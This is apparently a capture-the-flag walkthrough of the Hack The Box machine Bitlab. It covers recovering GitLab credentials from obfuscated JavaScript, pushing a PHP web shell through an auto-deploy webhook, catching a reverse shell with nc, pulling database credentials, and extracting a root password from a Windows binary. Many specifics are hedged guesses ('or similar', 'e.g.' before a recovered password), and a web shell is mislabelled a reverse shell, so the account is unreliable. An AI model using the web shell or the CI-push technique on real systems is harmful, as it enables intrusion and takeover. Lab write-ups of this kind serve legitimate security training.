# Hack The Box: Bitlab

**Difficulty:** Medium
**OS:** Linux

Bitlab is a Medium-level Linux machine focused heavily on Git and continuous integration (CI) workflows. The initial compromise is achieved by discovering obfuscated JavaScript credentials, accessing a GitLab repository, and exploiting an automated webhook (business logic flaw) to deploy a reverse shell to a live web server. Privilege escalation involves reverse engineering a Windows executable designed to launch Putty, extracting its credentials, and eventually leveraging Git hooks for root access.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.114
nmap -p 22,80 -sCV 10.10.10.114
```

The scan reveals two open ports:
*   **Port 22:** SSH (OpenSSH 7.6p1 Ubuntu)
*   **Port 80:** HTTP (nginx)

Navigating to the web service on port 80 displays the login page for an instance of GitLab Community Edition. We also find a static "Help" page or a link in the footer that points to `help.html` or a similar informational document.

## Web Application Analysis & Initial Access

### Deobfuscating JavaScript Credentials

Accessing the `help` page reveals standard documentation, but viewing the page's source code uncovers a peculiar JavaScript file or an inline script block. 

The JavaScript code appears heavily obfuscated, utilizing techniques like Hex hexadecimal encoding, `eval()`, or JavaScript packers (e.g., JSFuck).

```javascript
// Example obfuscated structure
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e...'));
```

We copy the obfuscated payload and use an online deobfuscator or simply replace the `eval` execution wrapper with `console.log` within a safe browser console to print the underlying code instead of executing it.

The deobfuscated JavaScript reveals logic designed to automatically populate a login form or store credentials. It contains plaintext credentials for a GitLab user:

```text
Username: clave
Password: 11des0081x
```

### Exploiting CI/CD Webhook Logic

We return to the GitLab login portal and authenticate using the recovered credentials. 

Inside GitLab, we find that the user `clave` has access to a project named `Profile` or a similarly named repository containing the source code for the main web application hosting the user profiles.

We examine the project's settings, specifically focusing on the CI/CD pipelines and Integrations/Webhooks. We discover an active webhook configured to trigger a deployment script (`deploy.php` or `pull.php`) on the main web server whenever a `Push` event occurs on the `master` branch.

This is a classic continuous integration business logic flaw. The server automatically trusts and deploys code pushed to the repository without strict review or isolated staging.

We use our access to the `Profile` repository to introduce malicious code.

1.  We navigate to the repository files in the GitLab interface.
2.  We upload a new file, selecting a standard PHP reverse shell payload (`shell.php`).
3.  We commit the changes and merge the file into the `master` branch.

```php
<?php system($_REQUEST['cmd']); ?>
```

The commit triggers the webhook. The backend server executes the deployment script, which pulls our `shell.php` file into the live web directory.

We navigate to our deployed web shell on the main web server.

```text
http://10.10.10.114/profile/shell.php?cmd=id
```

The command executes successfully. We use the web shell to spawn a reverse shell to our attacking machine.

```bash
nc -lnvp 9999
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

We gain initial access as the `www-data` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is located in the home directory of the system user `clave`. The directory is not readable by `www-data`.

We enumerate the web application's root directory (`/var/www/html/profile` or similar) to locate configuration files containing database credentials.

```bash
cat /var/www/html/profile/db_config.php
```

The configuration file reveals PostgreSQL credentials for the web application: `profiles:profiles`.

We connect to the local PostgreSQL database using these credentials.

```bash
psql -U profiles -d profiles -h 127.0.0.1
```

We query the database tables, specifically looking for user accounts. We extract the password for the `clave` user.

```sql
SELECT * FROM users;
```

The query returns a plaintext password for `clave` (e.g., `c3NoLXN0cjBuZy1wQHNz==`). We use this password to authenticate via `su` or SSH.

```bash
su clave
Password: c3NoLXN0cjBuZy1wQHNz==
# Authentication successful
```
We retrieve the `user.txt` flag from Clave's home directory.

## Privilege Escalation

Enumerating the system as `clave`, we check for unusual files in the user's home directory. We find a Windows executable file (e.g., `RemoteConnection.exe`).

### Reverse Engineering the Windows Executable

We transfer the `.exe` file to our attacking machine or a Windows analysis VM for reverse engineering.

We can analyze the binary dynamically by running it in a sandbox or statically using tools like `strings`, IDA Pro, or Ghidra. Running `strings` on the binary reveals several interesting artifacts, including mentions of "putty.exe," SSH flags, and an encrypted string or password.

Using a debugger like `x64dbg` or Ghidra, we analyze the binary's execution flow. We discover that the executable is a wrapper designed to launch `putty.exe` with hardcoded credentials to automatically connect to a specific host (likely the `root` account of the Bitlab server).

We use a debugger to step through the execution and set a breakpoint just before the `CreateProcess` or `ShellExecute` API call. When the breakpoint is hit, we examine the memory registers to view the arguments being passed to Putty.

```text
putty.exe -ssh root@10.10.10.114 -pw "Q3c1AqGHtoI0aXAYRm"
```

The debugger reveals the plaintext root password passed to the Putty executable.

We use this recovered password to switch to the root user directly on our existing SSH session.

```bash
su root
Password: Q3c1AqGHtoI0aXAYRm
# id
uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag is obtained.

*(Note: There is also an alternative intended path involving Git hooks. A user with write access to a repository can place a malicious script in the `.git/hooks/` directory (like `post-merge`). When a privileged user or root runs a specific `git pull` or `git merge` operation via a scheduled task, the malicious hook executes as root).*
